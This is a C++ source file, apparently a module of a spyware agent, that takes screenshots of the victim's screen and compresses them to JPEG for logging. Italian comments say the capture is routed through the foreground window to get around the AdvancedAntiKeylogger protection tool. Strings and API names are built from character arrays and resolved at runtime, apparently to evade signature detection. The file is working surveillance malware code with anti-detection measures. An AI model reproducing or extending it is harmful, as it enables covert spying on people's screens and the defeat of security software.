#include <Windows.h>
#include "agent_screenshot.h"
#include <gdiplus.h>
#include "proto.h"
using namespace Gdiplus;

typedef  HRESULT (WINAPI *CreateStreamOnHGlobal_p)(
  _In_   HGLOBAL hGlobal,
  _In_   BOOL fDeleteOnRelease,
  _Out_  LPSTREAM *ppstm
);

typedef HGLOBAL (WINAPI *GlobalFree_p)(
  _In_  HGLOBAL hMem
);

BOOL IsAero()
{
	
	HKEY hKey;
	DWORD composition=0, len=sizeof(DWORD);
	
	WCHAR strKey[] = { L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'D', L'W', L'M', L'\0' };
	if(RegOpenKeyEx(HKEY_CURRENT_USER, strKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) 
		return FALSE;

	WCHAR strVal[] = { L'C', L'o', L'm', L'p', L'o', L's', L'i', L't', L'i', L'o', L'n', L'\0' };
	if(RegQueryValueExW(hKey, strVal, NULL, NULL, (BYTE *)&composition, &len) != ERROR_SUCCESS) 
	{
		RegCloseKey(hKey);
		return FALSE;
	} 
	RegCloseKey(hKey);

	if (composition==0)
		return FALSE;
	
	return TRUE;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
   UINT  num = 0;          // number of image encoders
   UINT  size = 0;         // size of the image encoder array in bytes
   
   ImageCodecInfo* pImageCodecInfo = NULL;

   GetImageEncodersSize(&num, &size);
   if(size == 0)
      return -1;  // Failure

   pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
   if(pImageCodecInfo == NULL)
      return -1;  // Failure

   GetImageEncoders(num, size, pImageCodecInfo);

   for(UINT j = 0; j < num; ++j) {
      if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
      {
         *pClsid = pImageCodecInfo[j].Clsid;
         free(pImageCodecInfo);
         return j;  // Success
      }    
   }

   free(pImageCodecInfo);
   
   return -1;  // Failure
}

PBYTE JpgConvert(BYTE *dataptr, DWORD imageSize, DWORD *sizeDst, DWORD quality)
{
	
	HGLOBAL hBuffer = NULL, hBufferDst = NULL;
	void *pBuffer = NULL, *pBufferDst = NULL;
	IStream *pStream = NULL, *pStreamDst = NULL;
	BYTE *dataptrDst = NULL;
	
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	CLSID   encoderClsid;
	Image *image = NULL;
	EncoderParameters encoderParameters;
	
	if (!sizeDst)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] no sizeDst!!\n");
#endif
		return NULL;
	}
	*sizeDst = 0;
	
	if (GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Ok) 
	{
		CoUninitialize();
#ifdef _DEBUG
		OutputDebugString(L"[!!] GdiplusStartup FAIL\n");
#endif
		return NULL;
	}

	WCHAR strJPEG[] = { L'i', L'm', L'a', L'g', L'e', L'/', L'j', L'p', L'e', L'g', L'\0' };
	if (GetEncoderClsid(strJPEG, &encoderClsid) == -1) {
		GdiplusShutdown(gdiplusToken);
		CoUninitialize();
#ifdef _DEBUG
		OutputDebugString(L"[!!] GetEncoderClsid FAIL\n");
#endif
		return NULL;
	}
	
   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;
   encoderParameters.Parameter[0].Value = &quality;

    hBuffer = GlobalAlloc(GMEM_MOVEABLE, imageSize);
	if (!hBuffer) 
	{
		GdiplusShutdown(gdiplusToken);
		CoUninitialize();
#ifdef _DEBUG
		OutputDebugString(L"[!!] No hBuffer\n");
#endif
		return NULL;
	}
	
	pBuffer = GlobalLock(hBuffer);
	if (!pBuffer) 
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] No pBuffer\n");
#endif
		GlobalFree(hBuffer);
		GdiplusShutdown(gdiplusToken);
		CoUninitialize();
		return NULL;
	}
	
	
	CHAR strGlobalFree[] = { 'G', 'l', 'o', 'b', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
	CHAR strCreateStreamOnHGlobal[] = { 'C', 'r', 'e', 'a', 't', 'e', 'S', 't', 'r', 'e', 'a', 'm', 'O', 'n', 'H', 'G', 'l', 'o', 'b', 'a', 'l', 0x0 };
	CopyMemory(pBuffer, dataptr, imageSize);
	CreateStreamOnHGlobal_p fpCreateStreamOnHGlobal = (CreateStreamOnHGlobal_p) GetProcAddress(LoadLibrary(L"ole32"), strCreateStreamOnHGlobal);

	GlobalFree_p fpGlobalFree = (GlobalFree_p) GetProcAddress(LoadLibrary(L"kernel32"), strGlobalFree);
    if (fpCreateStreamOnHGlobal(hBuffer, FALSE, &pStream) == S_OK) 
	{
		image = new Image(pStream);
		if (image) 
		{
			if (hBufferDst = GlobalAlloc(GMEM_MOVEABLE, imageSize)) 
			{
				if (pBufferDst = GlobalLock(hBufferDst)) 
				{
					if (fpCreateStreamOnHGlobal(hBufferDst, FALSE, &pStreamDst) == S_OK) 
					{
						if (image->Save(pStreamDst, &encoderClsid, &encoderParameters) == Ok) 
						{		
							
							ULARGE_INTEGER position;
							LARGE_INTEGER null_int;
							DWORD dummy;
							null_int.HighPart = null_int.LowPart = 0;
							if (pStreamDst->Seek(null_int, STREAM_SEEK_CUR, &position) == S_OK) 
							{
								if (dataptrDst = (BYTE *)malloc(position.LowPart)) 
								{
									*sizeDst = position.LowPart;
									pStreamDst->Seek(null_int, STREAM_SEEK_SET, &position);
									pStreamDst->Read(dataptrDst, *sizeDst, &dummy);
								}
							}
						
						}
						pStreamDst->Release();
					
					}
					GlobalUnlock(hBufferDst);		
				}
				GlobalFree(hBufferDst);		
			}
			delete image;	
		}
		pStream->Release();
	}
	
	GlobalUnlock(hBuffer);
    fpGlobalFree(hBuffer);
	GdiplusShutdown(gdiplusToken);
	
    return dataptrDst;
}


PBYTE BmpToJpgLog(DWORD agent_tag, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality, PULONG uOut)
{
	HANDLE hf;
	PBYTE pBuffer = NULL;
	BITMAPFILEHEADER bmf = { };
	PBYTE source_bmp = NULL, dest_jpg = NULL;
	DWORD bmp_size, jpg_size;
	
	if (pBMI->biHeight * pBMI->biWidth * pBMI->biBitCount / 8 != cbData)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] != cbData\n");
#endif
		return pBuffer;
	}

    bmf.bfType = 'MB';
    bmf.bfSize = cbBMI+ cbData + sizeof(bmf); 
    bmf.bfOffBits = sizeof(bmf) + cbBMI; 

	bmp_size = bmf.bfOffBits + cbData;
	if (!(source_bmp = (BYTE *)malloc(bmp_size)))
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] malloc FAIL\n");
#endif
		return pBuffer;
	}

	memcpy(source_bmp, &bmf, sizeof(bmf));
	memcpy(source_bmp + sizeof(bmf), pBMI, cbBMI);
	memcpy(source_bmp + sizeof(bmf) + cbBMI, pData, cbData);

	if (dest_jpg = JpgConvert(source_bmp, bmp_size, &jpg_size, quality)) 
	{
		pBuffer = (PBYTE)malloc(jpg_size);
		memcpy(pBuffer, (PBYTE)dest_jpg, jpg_size);
		*uOut = jpg_size;
	}
	
	free(source_bmp);
	free(dest_jpg);
	
	return pBuffer;
}




PBYTE TakeScreenshot(PULONG uOut)
{
	PBYTE pScreenShotBuffer = NULL;
	HDC hdccap = 0, g_hScrDC = 0;
	HBITMAP hbmcap = 0;
	DWORD g_xscdim, g_yscdim, g_xmirr, g_ymirr, x_start;
	BITMAPINFOHEADER bmiHeader;
	DWORD *pdwFullBits = NULL;
	HGDIOBJ gdiold = 0; 
	BOOL is_aero;
	WINDOWINFO wininfo;
	int winx, winy;
	HWND grabwind;

	// Tutto il display. Viene calcolato dalla foreground window
	// per aggirare AdvancedAntiKeylogger
	grabwind = GetForegroundWindow();
	if (!grabwind)
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] No grabwind\n");
#endif
		return pScreenShotBuffer;
	}
	
	// Se dobbiamo prendere lo schermo intero su Aero prende il DC dello 
	
	is_aero = IsAero();
	
	if (is_aero) 
	{
		g_hScrDC = GetDC(NULL);
		wininfo.cbSize = sizeof(wininfo);
		
		if (!GetWindowInfo(GetDesktopWindow(), &wininfo)) 
		{
			CHAR strFuncName[] = { 'R', 'e', 'l', 'e', 'a', 's', 'e', 'D', 'C', '\0' };
			typedef int (WINAPI *ReleaseDC_p)(HWND, HDC);
			ReleaseDC_p fpReleaseDC = (ReleaseDC_p) GetProcAddress(GetModuleHandle(L"user32"), strFuncName);

			if (g_hScrDC) 
				fpReleaseDC(NULL, g_hScrDC);
			return pScreenShotBuffer;
		}
		
		wininfo.rcClient.left = 0;
		wininfo.rcClient.top = 0;
		wininfo.rcClient.right = GetSystemMetrics(SM_CXSCREEN);
		wininfo.rcClient.bottom = GetSystemMetrics(SM_CYSCREEN);
		
	} 
	else
	{
		g_hScrDC = GetDC(grabwind);
		wininfo.cbSize = sizeof(wininfo);
		if (!GetWindowInfo(grabwind, &wininfo)) 
		{
			if (g_hScrDC) 
				ReleaseDC(grabwind, g_hScrDC);
			return pScreenShotBuffer;
		}
	}

	
	g_xscdim = GetSystemMetrics(SM_CXSCREEN);
	g_yscdim = GetSystemMetrics(SM_CYSCREEN);
	if (wininfo.dwExStyle & WS_EX_LAYOUTRTL) 
	{
		winx = -(g_xscdim - wininfo.rcClient.right);
		winy = -wininfo.rcClient.top;
		x_start = g_xscdim-1;
		g_xmirr = -g_xscdim;
		g_ymirr = g_yscdim;
	}
	else
	{
		winx = -wininfo.rcClient.left;
		winy = -wininfo.rcClient.top;
		x_start = 0;
		g_xmirr = g_xscdim;
		g_ymirr = g_yscdim;
	}

	// Alloca la bitmap di dimensione sicuramente superiore a quanto sara' 
	if (!(pdwFullBits = (DWORD *)malloc(g_xscdim * g_yscdim * sizeof(DWORD)))) 
	{
		if (is_aero) 
		{
			if (g_hScrDC) 
				ReleaseDC(NULL, g_hScrDC);
		} 
		else
		{
			if (g_hScrDC) 
				ReleaseDC(grabwind, g_hScrDC);
		}
		return pScreenShotBuffer;
	}

	// Settaggi per il capture dello screen
	ZeroMemory(&bmiHeader, sizeof(BITMAPINFOHEADER));
	bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmiHeader.biWidth = g_xscdim;
	bmiHeader.biHeight = g_yscdim;
	bmiHeader.biPlanes = 1;
	bmiHeader.biBitCount = 16;
	bmiHeader.biCompression = BI_RGB;
	bmiHeader.biSizeImage = bmiHeader.biWidth * bmiHeader.biHeight * (bmiHeader.biBitCount/8);

	// Crea un DC memory
	hdccap = CreateCompatibleDC(NULL);
	hbmcap = CreateCompatibleBitmap(g_hScrDC, g_xscdim, g_yscdim);

	// Copia lo schermo nella bitmap
	gdiold = SelectObject(hdccap, hbmcap);

	//BitBlt(hdccap, 0, 0, g_xscdim, g_yscdim, g_hScrDC, -winx, -winy, SRCCOPY);

	StretchBlt(hdccap, x_start, 0, g_xmirr, g_ymirr, g_hScrDC, winx, winy, g_xscdim, g_yscdim, SRCCOPY);
	if (GetDIBits(hdccap, hbmcap, 0, g_yscdim, (BYTE *)pdwFullBits, (BITMAPINFO *)&bmiHeader, DIB_RGB_COLORS)) 
	{
		pScreenShotBuffer = BmpToJpgLog(PM_SCREENSHOT, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50, uOut);
	}
	
	// Rilascio oggetti....
	if (gdiold)
		DeleteObject(gdiold);
	if (hbmcap)   
		DeleteObject(hbmcap);
	if (hdccap)   
		DeleteDC(hdccap);
	if (is_aero) 
		if (g_hScrDC) 
			ReleaseDC(NULL, g_hScrDC);
	else
		if (g_hScrDC) 
			ReleaseDC(grabwind, g_hScrDC);

	free(pdwFullBits);
	
	return pScreenShotBuffer;
}


/*

VOID GetBitMap()
{
// get the device context of the screen
HDC hScreenDC = CreateDC(L"DISPLAY", NULL, NULL, NULL);     
// and a device context to put it in
HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

ULONG x = GetDeviceCaps(hScreenDC, HORZRES);
ULONG y = GetDeviceCaps(hScreenDC, VERTRES);

// maybe worth checking these are positive values
HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, x, y);

// get a new bitmap
HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, (HGDIOBJ)hBitmap);

BitBlt(hMemoryDC, 0, 0, x, y, hScreenDC, 0, 0, SRCCOPY);
hBitmap = (HBITMAP)SelectObject(hMemoryDC, (HGDIOBJ)hOldBitmap);

PBITMAPINFO pbi = CreateBitmapInfoStruct(hBitmap);
CreateBMPFile(pbi, hBitmap, hScreenDC);


// clean up
DeleteDC(hMemoryDC);
DeleteDC(hScreenDC);
}

VOID CreateBMPFile(PBITMAPINFO pbi, HBITMAP hBMP, HDC hDC) 
{ 
BITMAPFILEHEADER hdr;       // bitmap file-header 
PBITMAPINFOHEADER pbih;     // bitmap info-header 
LPBYTE lpBits;              // memory pointer 
//	DWORD dwTotal;              // total count of bytes 
//	DWORD cb;                   // incremental count of bytes 
//	PBYTE hp;                   // byte pointer 
//	DWORD dwTmp; 

pbih = (PBITMAPINFOHEADER)pbi; 
lpBits = (LPBYTE)malloc(pbih->biSizeImage);
if (!lpBits) 
{
#ifdef _DEBUG
OutputDebugString(L"[!!] No lpBits\n");
#endif
return;
}

// Retrieve the color table (RGBQUAD array) and the bits 
// (array of palette indices) from the DIB. 
if (!GetDIBits(hDC, hBMP, 0, (WORD) pbih->biHeight, lpBits, pbi, DIB_RGB_COLORS)) 
{
#ifdef _DEBUG
OutputDebugString(L"[!!] No GetDIBits\n");
#endif
return;
}


hdr.bfType = 0x4d42; // 0x42 = "B" 0x4d = "M" 
// Compute the size of the entire file. 
hdr.bfSize = (DWORD) (sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage); 
hdr.bfReserved1 = 0; 
hdr.bfReserved2 = 0; 

// Compute the offset to the array of color indices. 
hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof (RGBQUAD); 


//PBYTE pBitmapBuffer = (PBYTE)malloc(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD));
PBYTE pBitmapBuffer = (PBYTE)malloc(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pbih->biSizeImage);
memcpy(pBitmapBuffer, &hdr, sizeof(BITMAPFILEHEADER));
//memcpy(pBitmapBuffer + sizeof(BITMAPFILEHEADER), pbih, sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof(RGBQUAD));
memcpy(pBitmapBuffer + sizeof(BITMAPFILEHEADER), pbih, sizeof(BITMAPINFOHEADER) + pbih->biSizeImage);




// Free memory. 
free(lpBits);
}

PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
{ 
BITMAP bmp; 
PBITMAPINFO pbmi; 
WORD    cClrBits; 

// Retrieve the bitmap color format, width, and height. 
if (!GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp)) 
{
#ifdef _DEBUG
OutputDebugString(L"[+] GetObject FAIL\n");
#endif
return (PBITMAPINFO)NULL;
}

// Convert the color format to a count of bits. 
cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel); 
if (cClrBits == 1) 
cClrBits = 1; 
else if (cClrBits <= 4) 
cClrBits = 4; 
else if (cClrBits <= 8) 
cClrBits = 8; 
else if (cClrBits <= 16) 
cClrBits = 16; 
else if (cClrBits <= 24) 
cClrBits = 24; 
else cClrBits = 32; 

// Allocate memory for the BITMAPINFO structure. (This structure 
// contains a BITMAPINFOHEADER structure and an array of RGBQUAD 
// data structures.) 
if (cClrBits != 24) 
pbmi = (PBITMAPINFO) malloc(sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1<< cClrBits)); 
// There is no RGBQUAD array for the 24-bit-per-pixel format. 
else 
pbmi = (PBITMAPINFO) malloc(sizeof(BITMAPINFOHEADER)); 

// Initialize the fields in the BITMAPINFO structure. 

pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER); 
pbmi->bmiHeader.biWidth = bmp.bmWidth; 
pbmi->bmiHeader.biHeight = bmp.bmHeight; 
pbmi->bmiHeader.biPlanes = bmp.bmPlanes; 
pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel; 
if (cClrBits < 24) 
pbmi->bmiHeader.biClrUsed = (1<<cClrBits); 

// If the bitmap is not compressed, set the BI_RGB flag. 
pbmi->bmiHeader.biCompression = BI_RGB; 

// Compute the number of bytes in the array of color 
// indices and store the result in biSizeImage. 
// For Windows NT, the width must be DWORD aligned unless 
// the bitmap is RLE compressed. This example shows this. 
// For Windows 95/98/Me, the width must be WORD aligned unless the 
// bitmap is RLE compressed.
pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits +31) & ~31) / 8 * pbmi->bmiHeader.biHeight; 
// Set biClrImportant to 0, indicating that all of the 
// device colors are important. 
pbmi->bmiHeader.biClrImportant = 0; 

return pbmi; 
}

*/